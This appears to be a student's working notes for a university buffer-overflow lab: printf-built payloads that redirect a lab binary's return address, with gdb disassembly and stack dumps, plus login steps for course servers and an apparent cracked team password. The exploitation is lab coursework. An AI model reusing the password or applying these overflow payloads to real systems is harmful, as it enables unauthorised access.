@@ -1,0 +1,404 @@
+Part 1. ./try_me "$(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x72\x8e\x04\x08")"
+used gdb disas to identify addresses of test and log_result. Found the address with calls test and the return vaule after test runs.
+
+Dump of assembler code for function main:
+   0x08048f09 <+0>:     lea    0x4(%esp),%ecx
+   0x08048f0d <+4>:     and    $0xfffffff0,%esp
+   0x08048f10 <+7>:     pushl  -0x4(%ecx)
+   0x08048f13 <+10>:    push   %ebp
+   ...
+   0x08048f62 <+89>:    push   %eax
+   0x08048f63 <+90>:    call   0x8048e24 <test>
+   0x08048f68 <+95>:    add    $0x10,%esp
+   0x08048f6b <+98>:    jmp    0x8048f7d <main+116>
+   0x08048f6d <+100>:   sub    $0xc,%esp
+   ...
+
+Estimated number of characters needed for buffer overflow based on the size of the buffer and EBP - old and added the address of log_result as the return address instead of the address after the call to log_result.
+Ran in gdb and tweaked the length after looking at the stack and locating the return address.
+
+======================================================================================
+Part 2.  ./try_me "$(printf "ABBBBCCCCDDDDEEEEFFFFGGGG\x14\xd6\xff\xff\xa0\x8e\x04\x08\xaf\x8e\x04\x08")"
+Continuing from part one but instead of the address for uid_crack I used the address for uid_crack_advanced. From there I noticed that it tried to access the memory right before the address+4
+
+Breakpoint 1, log_result_advanced (code=135184128) at test.c:27
+27	in test.c
+(gdb) s
+37	in test.c
+(gdb) s
+Cannot access memory at address 0x4848484c
+
+So I changed that to be the valid address. Then the instruction pointer was pointing the value after the return address which was turned into junk. 
+
+(gdb) x/20x $sp
+0xffffd600:	0x00000000	0x080ea00c	0xffffd658	0x4104f220
+0xffffd610:	0x42424242	0x43434343	0x44444444	0x45454545
+0xffffd620:	0x46464646	0x47474747	0xffffd614	0x08048ea0
+0xffffd630:	0xffffd800	0x080ebf40	0x0000041b	0x08048f27
+
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd800 in ?? ()
+
+
+I changed that value to
+
+0x08048eaf <+15>:    call   0x806c630 <getuid>
+
+in the function log_result_advanced so that it would continue and run the function.
+
+
+=====================================================================================
+
+
+
+
+(1) Log in to bolt.cs.ucr.edu via ssh.
+
+(2) Once you are logged in, run this script.  It will automatically log you in to cs165-gateway.
+
+cs165_login
+
+(3) Now that you are on cs165-gateway, you need to use your cracked password to login to cs165-internal. The command line you would use:
+
+ssh team51@cs165-internal    (team[n] is your team number assigned on the google spreadsheet). 
+
+vqubok
+
+Project 3
+home/admin folder
+
+GDB commands
+
+info registers
+disas test
+x/64x $sp //64 double words starting from stack pointer
+
+b*0x1234 //breakpoint
+
+./try_me "$(printf "\x08\x32\x20\xfa\x10\x16")"
+
+ls | grep 1051
+
+0x08048e27 <+3>:     sub    $0x28,%esp
+
+(gdb) disas log_result
+Dump of assembler code for function log_result:
+   0x08048e72 <+0>:     push   %ebp
+   0x08048e73 <+1>:     mov    %esp,%ebp
+   0x08048e75 <+3>:     sub    $0x18,%esp
+   0x08048e78 <+6>:     sub    $0x8,%esp
+   0x08048e7b <+9>:     push   $0x440
+   0x08048e80 <+14>:    push   $0x80ebf40
+   0x08048e85 <+19>:    call   0x806cef0 <open>
+   0x08048e8a <+24>:    add    $0x10,%esp
+   0x08048e8d <+27>:    mov    %eax,-0xc(%ebp)
+   0x08048e90 <+30>:    sub    $0xc,%esp
+   0x08048e93 <+33>:    pushl  -0xc(%ebp)
+   0x08048e96 <+36>:    call   0x806d120 <close>
+   0x08048e9b <+41>:    add    $0x10,%esp
+   0x08048e9e <+44>:    leave
+   0x08048e9f <+45>:    ret
+
+
+0x08048e72 <+0>:     push   %ebp
+0x08048e72 
+
+0x08048ea0 <+0>:     push   %ebp
+
+disas main
+0x08048f18 <+15>:    sub    $0x10,%esp
+
+run "$(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x72\x8e\x04\x08")"
+
+Dump of assembler code for function main:
+   0x08048f09 <+0>:     lea    0x4(%esp),%ecx
+   0x08048f0d <+4>:     and    $0xfffffff0,%esp
+   0x08048f10 <+7>:     pushl  -0x4(%ecx)
+   0x08048f13 <+10>:    push   %ebp
+   0x08048f14 <+11>:    mov    %esp,%ebp
+   0x08048f16 <+13>:    push   %ebx
+   0x08048f17 <+14>:    push   %ecx
+   0x08048f18 <+15>:    sub    $0x10,%esp
+   0x08048f1b <+18>:    mov    %ecx,%ebx
+   0x08048f1d <+20>:    cmpl   $0x1,(%ebx)
+   0x08048f20 <+23>:    jle    0x8048f6d <main+100>
+   0x08048f22 <+25>:    call   0x806c630 <getuid>
+   0x08048f27 <+30>:    mov    %eax,-0xc(%ebp)
+   0x08048f2a <+33>:    sub    $0x4,%esp
+   0x08048f2d <+36>:    pushl  -0xc(%ebp)
+   0x08048f30 <+39>:    push   $0x80be2ad
+   0x08048f35 <+44>:    push   $0x80ebf40
+   0x08048f3a <+49>:    call   0x804f230 <sprintf>
+   0x08048f3f <+54>:    add    $0x10,%esp
+   0x08048f42 <+57>:    sub    $0x8,%esp
+   0x08048f45 <+60>:    push   $0x80ebf40
+   0x08048f4a <+65>:    push   $0x80be29e
+   0x08048f4f <+70>:    call   0x804f200 <printf>
+   0x08048f54 <+75>:    add    $0x10,%esp
+   0x08048f57 <+78>:    mov    0x4(%ebx),%eax
+   0x08048f5a <+81>:    add    $0x4,%eax
+   0x08048f5d <+84>:    mov    (%eax),%eax
+   0x08048f5f <+86>:    sub    $0xc,%esp
+   0x08048f62 <+89>:    push   %eax
+   0x08048f63 <+90>:    call   0x8048e24 <test>
+   0x08048f68 <+95>:    add    $0x10,%esp
+
+   0x08048f6b <+98>:    jmp    0x8048f7d <main+116>
+   0x08048f6d <+100>:   sub    $0xc,%esp
+   0x08048f70 <+103>:   push   $0x80be2c8
+   0x08048f75 <+108>:   call   0x804f790 <puts>
+   0x08048f7a <+113>:   add    $0x10,%esp
+   0x08048f7d <+116>:   lea    -0x8(%ebp),%esp
+   0x08048f80 <+119>:   pop    %ecx
+   0x08048f81 <+120>:   pop    %ebx
+   0x08048f82 <+121>:   pop    %ebp
+   0x08048f83 <+122>:   lea    -0x4(%ecx),%esp
+   0x08048f86 <+125>:   ret
+End of assembler dump.
+
+
+(gdb) disas log_result_advanced
+Dump of assembler code for function log_result_advanced:
+   0x08048ea0 <+0>:     push   %ebp
+   0x08048ea1 <+1>:     mov    %esp,%ebp
+   0x08048ea3 <+3>:     sub    $0x78,%esp
+   0x08048ea6 <+6>:     cmpl   $0xefbeadde,0x8(%ebp)
+   0x08048ead <+13>:    jne    0x8048f07 <log_result_advanced+103>
+
+   0x08048eaf <+15>:    call   0x806c630 <getuid>
+   0x08048eb4 <+20>:    mov    %eax,-0xc(%ebp)
+   0x08048eb7 <+23>:    sub    $0x4,%esp
+   0x08048eba <+26>:    pushl  -0xc(%ebp)
+   0x08048ebd <+29>:    push   $0x80be27c
+   0x08048ec2 <+34>:    lea    -0x74(%ebp),%eax
+   0x08048ec5 <+37>:    push   %eax
+   0x08048ec6 <+38>:    call   0x804f230 <sprintf>
+   0x08048ecb <+43>:    add    $0x10,%esp
+   0x08048ece <+46>:    sub    $0x8,%esp
+   0x08048ed1 <+49>:    lea    -0x74(%ebp),%eax
+   0x08048ed4 <+52>:    push   %eax
+   0x08048ed5 <+53>:    push   $0x80be29e
+   0x08048eda <+58>:    call   0x804f200 <printf>
+   0x08048edf <+63>:    add    $0x10,%esp
+   0x08048ee2 <+66>:    sub    $0x8,%esp
+   0x08048ee5 <+69>:    push   $0x440
+   0x08048eea <+74>:    lea    -0x74(%ebp),%eax
+   0x08048eed <+77>:    push   %eaxls
+   0x08048eee <+78>:    call   0x806cef0 <open>
+   0x08048ef3 <+83>:    add    $0x10,%esp
+   0x08048ef6 <+86>:    mov    %eax,-0x10(%ebp)
+   0x08048ef9 <+89>:    sub    $0xc,%esp
+   0x08048efc <+92>:    pushl  -0x10(%ebp)
+   0x08048eff <+95>:    call   0x806d120 <close>
+   0x08048f04 <+100>:   add    $0x10,%esp
+   0x08048f07 <+103>:   leave
+   0x08048f08 <+104>:   ret
+End of assembler dump.
+
+
+"$(printf "AAAAAAAAAAAAAAAAAAAAAAAAA\xde\xad\xbe\xef\xa0\x8e\x04\x08\")"
+run "$(printf "ABBBBCCCCDDDDEEEEFFFFGGGGHHHH\xa0\x8e\x04\x08")"
+
+run "$(printf "ABBBBCCCC\xde\xad\xbe\xef\x0xEEEFFFFGGGG\x14\xd6\xff\xff\xa0\x8e\x04\x08")"
+
+run "$(printf "ABBBBCCCCDDDDEEEEFFFFGGGG\x14\xd6\xff\xff\xa0\x8e\x04\x08\xaf\x8e\x04\x08")"
+
+0xffffd614:     0x43434343      0x44444444      0x45454545      0x46464646
+0xffffd624:     0x47474747      0x48484848      0x48484848      0xffffd800
+
+(gdb) info reg
+eax            0x32     50
+ecx            0x0      0
+edx            0x80eb4d4        135181524
+ebx            0xffffd670       -10640
+esp            0xffffd5b4       0xffffd5b4
+ebp            0xffffd62c       0xffffd62c
+esi            0x0      0
+edi            0x80ea00c        135176204
+eip            0x8048f07        0x8048f07 <log_result_advanced+103>
+eflags         0x213    [ CF AF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb)
+
+
+
+================================================================================
+
+
+
+Dump of assembler code for function main:
+   0x08048f09 <+0>:     lea    0x4(%esp),%ecx
+   0x08048f0d <+4>:     and    $0xfffffff0,%esp
+   0x08048f10 <+7>:     pushl  -0x4(%ecx)
+   0x08048f13 <+10>:    push   %ebp
+   0x08048f14 <+11>:    mov    %esp,%ebp
+   0x08048f16 <+13>:    push   %ebx
+   0x08048f17 <+14>:    push   %ecx
+   0x08048f18 <+15>:    sub    $0x10,%esp
+   0x08048f1b <+18>:    mov    %ecx,%ebx
+   0x08048f1d <+20>:    cmpl   $0x1,(%ebx)
+   0x08048f20 <+23>:    jle    0x8048f6d <main+100>
+   0x08048f22 <+25>:    call   0x806c630 <getuid>
+   0x08048f27 <+30>:    mov    %eax,-0xc(%ebp)
+   0x08048f2a <+33>:    sub    $0x4,%esp
+   0x08048f2d <+36>:    pushl  -0xc(%ebp)
+   0x08048f30 <+39>:    push   $0x80be2ad
+   0x08048f35 <+44>:    push   $0x80ebf40
+   0x08048f3a <+49>:    call   0x804f230 <sprintf>
+   0x08048f3f <+54>:    add    $0x10,%esp
+   0x08048f42 <+57>:    sub    $0x8,%esp
+   0x08048f45 <+60>:    push   $0x80ebf40
+   0x08048f4a <+65>:    push   $0x80be29e
+   0x08048f4f <+70>:    call   0x804f200 <printf>
+   0x08048f54 <+75>:    add    $0x10,%esp
+   0x08048f57 <+78>:    mov    0x4(%ebx),%eax
+   0x08048f5a <+81>:    add    $0x4,%eax
+   0x08048f5d <+84>:    mov    (%eax),%eax
+   0x08048f5f <+86>:    sub    $0xc,%esp
+   0x08048f62 <+89>:    push   %eax
+   0x08048f63 <+90>:    call   0x8048e24 <test>
+   0x08048f68 <+95>:    add    $0x10,%esp
+   0x08048f6b <+98>:    jmp    0x8048f7d <main+116>
+   0x08048f6d <+100>:   sub    $0xc,%esp
+   0x08048f70 <+103>:   push   $0x80be2c8
+   0x08048f75 <+108>:   call   0x804f790 <puts>
+   0x08048f7a <+113>:   add    $0x10,%esp
+   0x08048f7d <+116>:   lea    -0x8(%ebp),%esp
+   0x08048f80 <+119>:   pop    %ecx
+   0x08048f81 <+120>:   pop    %ebx
+   0x08048f82 <+121>:   pop    %ebp
+   0x08048f83 <+122>:   lea    -0x4(%ecx),%esp
+   0x08048f86 <+125>:   ret
+End of assembler dump.
+
+Dump of assembler code for function test:
+   0x08048e24 <+0>:     push   %ebp
+   0x08048e25 <+1>:     mov    %esp,%ebp
+   0x08048e27 <+3>:     sub    $0x28,%esp
+   0x08048e2a <+6>:     movl   $0x636261,-0x19(%ebp)
+   0x08048e31 <+13>:    movl   $0x0,-0x15(%ebp)
+   0x08048e38 <+20>:    movl   $0x0,-0x11(%ebp)
+   0x08048e3f <+27>:    movl   $0x0,-0xd(%ebp)
+   0x08048e46 <+34>:    movb   $0x0,-0x9(%ebp)
+   0x08048e4a <+38>:    sub    $0x8,%esp
+   0x08048e4d <+41>:    pushl  0x8(%ebp)
+   0x08048e50 <+44>:    lea    -0x19(%ebp),%eax
+   0x08048e53 <+47>:    push   %eax
+   0x08048e54 <+48>:    call   0x80481e0
+   0x08048e59 <+53>:    add    $0x10,%esp
+   0x08048e5c <+56>:    sub    $0x8,%esp
+   0x08048e5f <+59>:    lea    -0x19(%ebp),%eax
+   0x08048e62 <+62>:    push   %eax
+   0x08048e63 <+63>:    push   $0x80be268
+   0x08048e68 <+68>:    call   0x804f200 <printf>
+   0x08048e6d <+73>:    add    $0x10,%esp
+   0x08048e70 <+76>:    leave
+   0x08048e71 <+77>:    ret
+End of assembler dump.
+
+Dump of assembler code for function log_result_advanced:
+   0x08048ea0 <+0>:     push   %ebp
+   0x08048ea1 <+1>:     mov    %esp,%ebp
+   0x08048ea3 <+3>:     sub    $0x78,%esp
+   0x08048ea6 <+6>:     cmpl   $0xefbeadde,0x8(%ebp)
+   0x08048ead <+13>:    jne    0x8048f07 <log_result_advanced+103>
+   0x08048eaf <+15>:    call   0x806c630 <getuid>
+   0x08048eb4 <+20>:    mov    %eax,-0xc(%ebp)
+   0x08048eb7 <+23>:    sub    $0x4,%esp
+   0x08048eba <+26>:    pushl  -0xc(%ebp)
+   0x08048ebd <+29>:    push   $0x80be27c
+   0x08048ec2 <+34>:    lea    -0x74(%ebp),%eax
+   0x08048ec5 <+37>:    push   %eax
+   0x08048ec6 <+38>:    call   0x804f230 <sprintf>
+   0x08048ecb <+43>:    add    $0x10,%esp
+   0x08048ece <+46>:    sub    $0x8,%esp
+   0x08048ed1 <+49>:    lea    -0x74(%ebp),%eax
+   0x08048ed4 <+52>:    push   %eax
+   0x08048ed5 <+53>:    push   $0x80be29e
+   0x08048eda <+58>:    call   0x804f200 <printf>
+   0x08048edf <+63>:    add    $0x10,%esp
+   0x08048ee2 <+66>:    sub    $0x8,%esp
+   0x08048ee5 <+69>:    push   $0x440
+   0x08048eea <+74>:    lea    -0x74(%ebp),%eax
+   0x08048eed <+77>:    push   %eax
+   0x08048eee <+78>:    call   0x806cef0 <open>
+   0x08048ef3 <+83>:    add    $0x10,%esp
+   0x08048ef6 <+86>:    mov    %eax,-0x10(%ebp)
+   0x08048ef9 <+89>:    sub    $0xc,%esp
+   0x08048efc <+92>:    pushl  -0x10(%ebp)
+   0x08048eff <+95>:    call   0x806d120 <close>
+   0x08048f04 <+100>:   add    $0x10,%esp
+   0x08048f07 <+103>:   leave
+   0x08048f08 <+104>:   ret
+End of assembler dump.
+
+Dump of assembler code for function log_result:
+   0x08048e72 <+0>:     push   %ebp
+   0x08048e73 <+1>:     mov    %esp,%ebp
+   0x08048e75 <+3>:     sub    $0x18,%esp
+   0x08048e78 <+6>:     sub    $0x8,%esp
+   0x08048e7b <+9>:     push   $0x440
+   0x08048e80 <+14>:    push   $0x80ebf40
+   0x08048e85 <+19>:    call   0x806cef0 <open>
+   0x08048e8a <+24>:    add    $0x10,%esp
+   0x08048e8d <+27>:    mov    %eax,-0xc(%ebp)
+   0x08048e90 <+30>:    sub    $0xc,%esp
+   0x08048e93 <+33>:    pushl  -0xc(%ebp)
+   0x08048e96 <+36>:    call   0x806d120 <close>
+   0x08048e9b <+41>:    add    $0x10,%esp
+   0x08048e9e <+44>:    leave
+   0x08048e9f <+45>:    ret
+End of assembler dump.
+
+
+0x80ebf40 <filename>:   ""
+(gdb) x/8xw $esp
+0xffffd630:     0x080ebf40      0x080be2ad      0x0000041b      0x08048f27
+0xffffd640:     0x00000002      0xffffd6f4      0xffffd700      0x0000041b
+
+(gdb) x/80xw $esp
+0xffffd600:     0x00000000      0x080ea00c      0xffffd658      0x4104f220
+0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd620:     0x41414141      0x41414141      0x41414141      0x08048e72
+0xffffd630:     0xffffd800      0x080ebf40      0x0000041b      0x08048f27
+0xffffd640:     0x00000002      0xffffd6f4      0xffffd700      0x0000041b
+0xffffd650:     0xffffd670      0x080481a8      0x08049710      0x0804915a
+0xffffd660:     0x00000000      0x080ea00c      0x08049710      0x0804915a
+0xffffd670:     0x00000002      0xffffd6f4      0xffffd700      0x00000000
+0xffffd680:     0x00000000      0x080481a8      0x00000000      0x080ea00c
+0xffffd690:     0x08049710      0xe99b17e1      0x1f15c60e      0x00000000
+0xffffd6a0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd6b0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd6c0:     0x00000002      0x00000000      0x00000000      0x08048d2b
+0xffffd6d0:     0x08048f09      0x00000002      0xffffd6f4      0x08049670
+0xffffd6e0:     0x08049710      0x00000000      0xffffd6ec      0x00000000
+0xffffd6f0:     0x00000002      0xffffd821      0xffffd834      0x00000000
+0xffffd700:     0xffffd856      0xffffd86a      0xffffd88d      0xffffd89d
+0xffffd710:     0xffffd8ae      0xffffd8bc      0xffffd8dd      0xffffd8f1
+0xffffd720:     0xffffd8fd      0xffffde99      0xffffdea5      0xffffdedc
+0xffffd730:     0xffffdef8      0xffffdf07      0xffffdf17      0xffffdf28
+
+
+
+
+(gdb) disas sprintf
+Dump of assembler code for function sprintf:
+   0x0804f230 <+0>:     sub    $0x1c,%esp
+   0x0804f233 <+3>:     lea    0x28(%esp),%eax 		//$eax = $esp+28
+   0x0804f237 <+7>:     mov    %eax,0x8(%esp)		//$(esp + 8) = $eax
+   0x0804f23b <+11>:    mov    0x24(%esp),%eax 		//%eax = $esp+24
+   0x0804f23f <+15>:    mov    %eax,0x4(%esp)		//$(esp+4) = $eax
+   0x0804f243 <+19>:    mov    0x20(%esp),%eax 		//$eax = esp +20
+   0x0804f247 <+23>:    mov    %eax,(%esp) 			//esp = eax
+   0x0804f24a <+26>:    call   0x804f910 <vsprintf> // call vsprintf
+   0x0804f24f <+31>:    add    $0x1c,%esp
+   0x0804f252 <+34>:    ret
+End of assembler dump.
+
+
+run "$(printf "Auid_1051_crack_superGGGG\x14\xd6\xff\xff\xa0\x8e\x04\x08\xaf\x8e\x04\x08")"
